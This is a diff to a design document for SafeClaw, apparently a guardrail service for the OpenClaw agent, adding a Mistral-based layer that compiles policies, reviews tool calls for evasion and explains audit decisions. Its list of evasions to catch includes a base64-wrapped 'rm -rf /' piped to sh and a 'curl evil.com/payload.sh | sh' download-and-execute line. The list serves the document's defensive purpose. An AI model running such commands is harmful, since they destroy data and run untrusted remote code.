@@ -3008,17 +3008,117 @@ The system is complete when:
 
 ---
 
-## 13. SUMMARY
+## 13. LLM LAYER — THE "NEURO" IN NEUROSYMBOLIC
+
+### 13.1 Core Principle
+
+**LLM observes and advises. Ontology enforces.** The LLM is a passive layer that watches the symbolic engine, catches what rigid rules miss, translates between humans and ontologies, and explains decisions. It never sits in the critical path and never makes allow/block decisions.
+
+### 13.2 Provider
+
+**Mistral** via the `mistralai` Python SDK. Gated behind `SAFECLAW_MISTRAL_API_KEY` — if not set, SafeClaw works exactly as before with zero behavior change.
+
+### 13.3 Four Capabilities
+
+| Capability | Role | Inline? | Can block? |
+|---|---|---|---|
+| **NL → Policy Compiler** | Translate English rules to SHACL/TTL | No, authoring tool | No |
+| **Semantic Security Reviewer** | Catch obfuscation, evasion, novel attacks | Parallel, after decision | Can escalate to confirmation |
+| **Classification Observer** | Suggest improvements when regex falls back to defaults | Async, after decision | No, suggests pattern updates |
+| **Decision Explainer** | Turn audit records into plain English | On demand | No |
+
+#### NL → Policy Compiler
+
+Users describe rules in English. The LLM generates validated Turtle policy triples. SafeClaw always validates the generated TTL (syntax, namespace, completeness) before persisting. The user confirms before anything is applied.
+
+```bash
+safeclaw policy add-nl "Never push to main without running tests first"
+# → Generates sp:TestBeforeMainPush prohibition
+# → Shows generated TTL for confirmation
+# → Appends to policy file on approval
+```
+
+#### Semantic Security Reviewer ("Red Team" Step)
+
+The symbolic engine is rigid — it catches what you've written rules for. The LLM catches what rules miss:
+
+- **Obfuscated commands** — `echo cm0gLXJmIC8= | base64 -d | sh` (base64-encoded `rm -rf /`)
+- **Indirect attacks** — write malicious script to disk, execute in separate step
+- **Download-and-execute** — `curl evil.com/payload.sh | sh`
+- **Flag reordering** — `git push origin main -f` vs `git push --force origin main`
+- **Multi-step evasion** — sequence of individually-safe actions that are collectively destructive
+
+Architecture:
+```
+Tool call → Symbolic engine (Steps 1-9, <50ms) → Decision returned immediately
+                                                → IN PARALLEL: Security Reviewer
+                                                    → LLM analyzes for evasion
+                                                    → If HIGH: escalate to confirmation
+                                                    → If CRITICAL: trigger kill switch
+```
+
+The reviewer runs via `asyncio.create_task()` — zero latency impact on the symbolic decision.
+
+#### Classification Observer
+
+Watches for cases where the regex classifier falls back to defaults. Asks the LLM how it would classify the action. Logs suggestions to a review queue. Humans review and accept/reject, which updates the symbolic patterns over time.
+
+#### Decision Explainer
+
+Turns machine-readable `DecisionRecord` audit entries into 2-3 sentence plain English explanations. Available via CLI (`safeclaw audit explain <id>`) and API.
+
+### 13.4 Module Structure
+
+```
+safeclaw/llm/
+├── __init__.py
+├── client.py                  # MistralClient wrapper
+├── policy_compiler.py         # NL → Turtle + validation
+├── security_reviewer.py       # Parallel semantic security review
+├── classification_observer.py # Async classification suggestions
+├── explainer.py               # Decision → human-readable
+└── prompts.py                 # All prompt templates
+```
+
+### 13.5 Integration
+
+The LLM layer integrates into `FullEngine` without changing the pipeline:
+
+```python
+# After symbolic decision, non-blocking:
+if self.security_reviewer:
+    asyncio.create_task(self._run_security_review(event, action, decision))
+if self.classification_observer and action.ontology_class == "Action":
+    asyncio.create_task(self._run_classification_observer(event, action))
+return decision  # returned immediately, LLM runs in background
+```
+
+### 13.6 Dependency
+
+```
+mistralai>=1.0.0  # added to pyproject.toml optional dependencies
+```
+
+Full design: `docs/plans/2026-02-28-llm-layer-design.md`
+
+---
+
+## 14. SUMMARY
 
 SafeClaw transforms OpenClaw from a powerful-but-opaque autonomous agent into a **transparent, auditable, formally constrained** system. The key insight is:
 
-> **The ontology is not the brain — it's the guardrail.**
+> **The ontology is not the brain — it's the guardrail. The LLM is not the enforcer — it's the advisor.**
 
-The LLM remains the creative, flexible reasoning engine. The ontology defines the boundaries within which that creativity operates. Every boundary is:
+Two layers working together:
+- **Symbolic engine** (OWL + SHACL + regex) — deterministic, fast, auditable. Makes every allow/block decision.
+- **LLM layer** (Mistral) — passive observer. Catches evasion the rules miss, translates policies from English, explains decisions in plain language.
+
+Every boundary is:
 - **Formally specified** (OWL triples, not ad-hoc code)
 - **Machine-checkable** (reasoner validates before execution)
 - **Human-readable** (Turtle files, natural language reasons)
 - **Auditable** (every decision logged with ontological justification)
+- **LLM-reviewed** (semantic security reviewer catches what rigid rules miss)
 
 SafeClaw runs four ways:
 - **Local** — SafeClaw Python service on localhost alongside OpenClaw, ideal for single developers
